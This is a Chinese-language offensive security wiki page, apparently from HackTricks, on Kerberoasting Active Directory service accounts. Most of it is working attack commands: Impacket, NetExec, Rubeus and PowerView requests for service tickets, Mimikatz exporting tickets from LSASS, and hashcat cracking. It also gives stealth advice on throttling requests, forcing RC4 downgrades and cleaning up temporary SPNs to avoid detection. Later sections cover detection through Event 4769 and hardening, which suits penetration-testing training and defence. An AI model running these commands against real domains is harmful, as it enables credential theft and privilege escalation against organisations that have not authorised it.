# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting 的重点是获取 TGS 票据，具体来说，是获取与 Active Directory (AD) 中以用户帐户（不包括计算机帐户）运行的服务相关的票据。这些票据使用源自用户密码的密钥加密，因此可以离线破解。用户帐户被用作服务帐户的标志是其 ServicePrincipalName (SPN) 属性非空。

任何经过身份验证的域用户都可以请求 TGS 票据，因此不需要特殊权限。<sup>[[4]](#references)[[5]](#references)</sup>

### 关键要点

- 目标是以用户帐户运行的服务所对应的 TGS 票据（即设置了 SPN 的帐户；不包括计算机帐户）。
- 票据使用从服务帐户密码派生的密钥加密，可以离线破解。
- 不需要提升权限；任何经过身份验证的帐户都可以请求 TGS 票据。

> [!WARNING]
> 大多数公开工具倾向于请求 RC4-HMAC (etype 23) 服务票据，因为它们比 AES 更容易快速破解。RC4 TGS 哈希以 `$krb5tgs$23$*` 开头，AES128 以 `$krb5tgs$17$*` 开头，AES256 以 `$krb5tgs$18$*` 开头。不过，许多环境正转向仅使用 AES。不要假定只有 RC4 才值得关注。
> 另外，避免采用“spray-and-pray”式的 Kerberoast。Rubeus 默认的 kerberoast 会查询并请求所有 SPN 的票据，动静很大。应先枚举并筛选值得关注的主体，再针对性地操作。

### 服务帐户密钥与 Kerberos 加密成本

许多服务仍使用人工管理密码的用户帐户运行。KDC 使用从这些密码派生的密钥加密服务票据，并将密文交给任何经过身份验证的主体，因此 Kerberoast 可以无限次离线猜测密码，不会触发帐户锁定或留下 DC 遥测记录。加密模式决定了破解所需的计算资源：

| 模式 | 密钥派生 | 加密类型 | RTX 5090 的近似吞吐量* | 备注 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1，迭代 4,096 次，使用从域 + SPN 生成的每个主体独有的 salt | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~每秒 680 万次猜测 | Salt 可阻止彩虹表攻击，但仍能快速破解短密码。 |
| RC4 + NT hash | 对密码执行一次 MD4（不加 salt 的 NT hash）；Kerberos 只会为每张票据混入一个 8 字节的混淆值 | etype 23 (`$krb5tgs$23$`) | ~每秒 **41.8 亿**次猜测 | 比 AES 快约 1000 倍；只要 `msDS-SupportedEncryptionTypes` 允许，攻击者就会强制使用 RC4。 |

*基准数据来自 Chick3nman，引用自 [Matthew Green 对 Kerberoasting 的分析](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)。<sup>[[3]](#references)</sup>

RC4 的混淆值只会随机化密钥流；它不会增加每次猜测所需的计算量。除非服务帐户使用随机密钥（gMSA/dMSA、计算机帐户或由密码库管理的字符串），否则破解速度完全取决于 GPU 算力。强制仅使用 AES etype 可消除每秒数十亿次猜测的降级风险，但弱的人类密码仍会被 PBKDF2 破解。<sup>[[3]](#references)</sup>

### 攻击

#### Linux

参考文献 [1] 提供了一个使用 NetExec 请求可用于 Kerberoast 的票据，再用 Hashcat 破解它们的实用端到端示例。<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

包含 kerberoast 检查的多功能工具：

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- 枚举可进行 Kerberoast 的用户

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- 技巧 1：请求 TGS 并从内存中 dump

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technique 2：自动化工具

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> TGS 请求会生成 Windows Security Event 4769（请求了 Kerberos 服务票证）。

### OPSEC 和仅支持 AES 的环境

- 对不支持 AES 的账户主动请求 RC4：
  - Rubeus：`/rc4opsec` 使用 tgtdeleg 枚举不支持 AES 的账户，并请求 RC4 服务票证。
  - Rubeus：将 `/tgtdeleg` 与 kerberoast 搭配使用，也会在可能时触发 RC4 请求。<sup>[[6]](#references)</sup>
- 对仅支持 AES 的账户进行 Roast，避免静默失败：
  - Rubeus：`/aes` 会枚举启用了 AES 的账户，并请求 AES 服务票证（etype 17/18）。
  - 如果你已经持有 TGT（通过 PTT 或从 .kirbi 文件获取），可以将 `/ticket:<blob|path>` 与 `/spn:<SPN>` 或 `/spns:<file>` 搭配使用，并跳过 LDAP。
- 目标选择、限速和减少噪声：
  - 使用 `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>` 和 `/jitter:<1-100>`。
  - 使用 `/pwdsetbefore:<MM-dd-yyyy>` 筛选可能使用弱密码的账户（密码较旧），或使用 `/ou:<DN>` 针对特权 OU。<sup>[[8]](#references)</sup>

示例（Rubeus）：

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### 持久化 / 滥用

如果你控制或可以修改某个帐户，可以通过添加 SPN 使其可被 Kerberoast：

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

降级账户以启用 RC4，便于 cracking（需要对目标对象具有写入权限）：

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### 通过对用户对象拥有 GenericWrite/GenericAll 权限进行定向 Kerberoast（临时 SPN）

当 BloodHound 显示你可以控制某个用户对象（例如拥有 GenericWrite/GenericAll 权限）时，即使该用户当前没有任何 SPN，你也可以可靠地对该特定用户进行“targeted-roast”：<sup>[[9]](#references)</sup>

- 为受控用户添加一个临时 SPN，使其可被 roast。
- 请求一个使用 RC4（etype 23）加密的该 SPN 的 TGS-REP，以便更容易破解。
- 使用 hashcat 破解 `$krb5tgs$23$...` 哈希。
- 清理 SPN，以减少痕迹。

Windows（PowerView/Rubeus）：

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux 单行命令（targetedKerberoast.py 自动执行添加 SPN -> 请求 TGS（etype 23）-> 移除 SPN）：<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

使用 hashcat autodetect 破解输出（`$krb5tgs$23$` 使用 mode 13100）：

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

检测说明：添加/删除 SPN 会产生目录更改（目标用户上的 Event ID 5136/4738），TGS 请求会生成 Event ID 4769。请考虑限制请求频率并及时清理。

你可以在这里找到有用的 kerberoast 攻击工具：https://github.com/nidem/kerberoast

如果你在 Linux 上遇到此错误：`Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`，这是本地时间偏差导致的。请与 DC 同步：

- `ntpdate <DC_IP>`（某些发行版中已弃用）
- `rdate -n <DC_IP>`

### 无需域账户的 Kerberoast（AS-requested STs）

2022 年 9 月，Charlie Clark 展示了：如果主体不需要预身份验证，可以通过构造 KRB_AS_REQ 并修改请求正文中的 sname 来获取服务票据，实际上是获取服务票据而非 TGT。这类似于 AS-REP roasting，且不需要有效的域凭据。

详情请参阅 Semperis 的文章“New Attack Paths: AS-requested STs”。<sup>[[10]](#references)</sup>

> [!WARNING]
> 你必须提供用户列表，因为没有有效凭据时，无法使用此技术查询 LDAP。

Linux

- Impacket（PR #1413）：

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

相关

如果目标是可进行 AS-REP roast 的用户，另请参阅：

{{#ref}}
asreproast.md
{{#endref}}

### 检测

Kerberoasting 可以做到隐蔽。查找来自 DC 的 Event ID 4769，并应用筛选条件以减少噪声：

- 排除服务名称 `krbtgt` 和以 `$` 结尾的服务名称（计算机帐户）。
- 排除来自机器帐户（`*$$@*`）的请求。
- 仅处理成功的请求（Failure Code `0x0`）。
- 跟踪加密类型：RC4 (`0x17`)、AES128 (`0x11`)、AES256 (`0x12`)。不要只针对 `0x17` 触发告警。

PowerShell 初步排查示例：

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

Additional ideas:

- 为每台主机/用户建立正常 SPN 使用基线；如果单个 principal 在短时间内请求大量不同的 SPN，则发出警报。
- 在已强化 AES 的域中标记异常的 RC4 使用情况。

### Mitigation / Hardening

- 服务使用 gMSA/dMSA 或计算机账户。托管账户使用 120 个以上字符的随机密码，并自动轮换，因此离线破解不切实际。<sup>[[7]](#references)</sup>
- 通过将 `msDS-SupportedEncryptionTypes` 设置为仅使用 AES（十进制 24 / 十六进制 0x18）来强制服务账户使用 AES，然后轮换密码以派生 AES 密钥。<sup>[[7]](#references)</sup>
- 尽可能在环境中禁用 RC4，并监控 RC4 使用尝试。在 DC 上，可以使用 `DefaultDomainSupportedEncTypes` 注册表值，为未设置 `msDS-SupportedEncryptionTypes` 的账户指定默认值。请充分测试。
- 从用户账户中移除不必要的 SPN。<sup>[[7]](#references)</sup>
- 如果无法使用托管账户，则为服务账户设置较长的随机密码（25 个以上字符）；禁止使用常见密码并定期审计。<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP Kerberoast + hashcat 实战破解](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting：利用遗留 Kerberos 加密技术发起的低技术、高影响力攻击（2025-09-10）](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos（II）：如何攻击 Kerberos？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos 滥用：T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting：在启用 AES 时请求使用 RC4 加密的 TGS](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog（2024-10-11）– Microsoft 关于缓解 Kerberoasting 的指导](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast 命令文档](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL 凭据 → Targeted Kerberoast → Unconstrained Delegation → DCSync 获取 DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – 新的攻击路径？AS Requested Service Tickets（Charlie Clark，2022 年 9 月）](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
